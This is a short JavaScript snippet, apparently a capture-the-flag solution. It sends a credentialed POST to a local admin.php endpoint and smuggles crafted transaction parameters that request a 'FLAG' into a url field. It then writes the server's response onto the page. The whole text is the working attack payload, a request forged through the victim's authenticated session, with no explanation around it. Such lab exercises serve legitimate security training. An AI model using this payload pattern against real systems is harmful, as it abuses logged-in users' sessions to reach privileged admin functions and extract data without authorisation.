fetch("http://localhost:5000/admin.php", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "url=" + encodeURIComponent("http://localhost:5000/admin.php?transactions[0][amount]=1&transactions[0][country]=FLAG")
})
.then(r => r.text())
.then(t => {
  const pre = document.createElement("pre");
  pre.textContent = t; // safer than innerHTML
  document.body.appendChild(pre);
})
.catch(console.error);

